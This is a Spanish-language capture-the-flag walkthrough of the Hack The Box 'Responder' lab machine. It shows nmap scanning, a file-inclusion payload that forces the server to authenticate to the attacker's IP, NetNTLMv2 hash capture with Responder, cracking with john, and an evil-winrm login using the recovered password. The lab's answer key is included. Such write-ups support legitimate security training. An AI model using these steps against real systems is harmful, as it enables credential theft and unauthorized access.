Vamos a ver las herramientas [[john]], [[Herramientas-Comandos/Responder|Responder]], [[evil-winrm]]

------

1)Al visitar el servicio web utilizando la dirección IP, ¿cuál es el dominio al que se nos redirige?
	unika.htb

2)¿Qué lenguaje de scripting se utiliza en el servidor para generar páginas web?
	php

3)¿Cómo se llama el parámetro URL que se utiliza para cargar versiones de la página web en distintos idiomas?
	page
	
4)¿Cuál de los siguientes valores para el parámetro `page` sería un ejemplo de explotación de una vulnerabilidad Local File Include (LFI): «french.html», «//10.10.14.6/somefile», «../../../../../../../../windows/system32/drivers/etc/hosts», «minikatz.exe»
	../../../../../../../../windows/system32/drivers/etc/hosts
	[[LFI(Local File Inclusion)]]

5)¿Cuál de los siguientes valores para el parámetro `page` sería un ejemplo de explotación de una vulnerabilidad Remote File Include (RFI): «french.html», «//10.10.14.6/somefile», «../../../../../../../../windows/system32/drivers/etc/hosts», «minikatz.exe»
	//10.10.14.6/somefile
	[[RFI(Remote File Inclusion)]]

6)¿Qué significa NTLM?
	new technology lan manager
	[[NTLM]]

7)¿Qué bandera utilizamos en la utilidad Responder para especificar la interfaz de red?
	-I 
	[[Apuntes Directo/Herramientas-Comandos/Responder|Responder]]

8)Hay varias herramientas que toman un desafío/respuesta NetNTLMv2 y prueban millones de contraseñas para ver si alguna de ellas genera la misma respuesta. Una de estas herramientas se conoce a menudo como `john`, pero el nombre completo es ¿qué?
	john the ripper

9)¿Cuál es la contraseña del usuario administrador?
	badminton
	
10)Utilizaremos un servicio Windows (es decir, que se ejecuta en la caja) para acceder remotamente a la máquina Responder utilizando la contraseña que hemos recuperado. ¿En qué puerto TCP escucha?
	5985

# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.129.7.210
nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.129.7.210 -oG allports
extractPorts allports
nmap -sCV -p80,5985 10.129.7.210 -oN target
```

![[Imagenes/Responder1.png]]


![[Imagenes/Responder2.png]]

![[Imagenes/Responder3.png]]

Por el ttl sabemos que es una maquina windows, y que el puerto 80 esta corriendo con un apache, y el 5985 tambien esta abierto con un servicio http

---------
# [[Enumeracion con pequeño script de NMAP y Whatweb-wappalyzer]]

![[Imagenes/Responder5.png]]

![[Imagenes/Responder7.png]]
El script de enumeracion de nmap no estaria corriendo

# Ingreso a la pagina web y /etc/hosts

Al intentar entrar nos envia a unika.htb asi que lo vamos a añadir al /etc/hosts
![[Imagenes/Responder4.png]]


![[Imagenes/Responder6.png]]
Y ya podemos entrar a la pagina web sin ningun tipo de problema

--------------
# Intrusion a la maquina en escucha con [[Apuntes Directo/Herramientas-Comandos/Responder|Responder]] por servicio [[NTLM]] y despues nos conectamos con [[evil-winrm]]


#### Escucha con [[Herramientas-Comandos/Responder|Responder]]
```shell
responder -I tun0
```

![[Responder1.png]]

Estando en escucha con el responder entramos a este link `http://unika.htb/?page=//10.10.16.16/test` para que envie una peition y interceptarla (El archivo test no existe)
El resultado se va a almacenar en el archivo ubicado en el directorio `/usr/share/responder/logs`

![[Responder3.png]]

![[Responder2.png]]

-------------
#### Crackear contraseña con [[john]]

```
Administrator::RESPONDER:11747b28872917dc:94608A1714685561A5969FBC2DEC397B:01010000000000008005119122DDDB01A8ED2F49A48DFFAE000000000200080056004A004900570001001E00570049004E002D005A004A004F0036004F0033005900520051005500580004003400570049004E002D005A004A004F0036004F003300590052005100550058002E0056004A00490057002E004C004F00430041004C000300140056004A00490057002E004C004F00430041004C000500140056004A00490057002E004C004F00430041004C00070008008005119122DDDB0106000400020000000800300030000000000000000100000000200000C00EBF27997D14D532A5F131BBE2EABB664335155553D8B17BD87E44C9C129600A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310036000000000000000000
```

```shell
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

![[Responder6.png]]

Y nos da la contraseña: badminton

------
#### Intrusion a la maquina con [[evil-winrm]]

```shell
evil-winrm -i 10.129.95.234 -u administrator -p badminton
```

Teniamos la contraseña, pero fui probrando el usuario hasta que di con administrator, la idea era probar admin, root y administrator que son los usuarios mas comunes con privilegios
![[Responder 8.png]]

Una vez dentro de la maquina usamos el comando `dir` para listar el contenido de los directorios que seria igual a un `ls` y despues el comando `cd` como tambien se usa en linux

![[Responder 7.png]]

# Creditos
Writeup Oficial HackTheBox
[Writeup Anthony](https://anthonybahn.medium.com/tier-1-hack-the-box-mission-responder-7425b7ae254b)
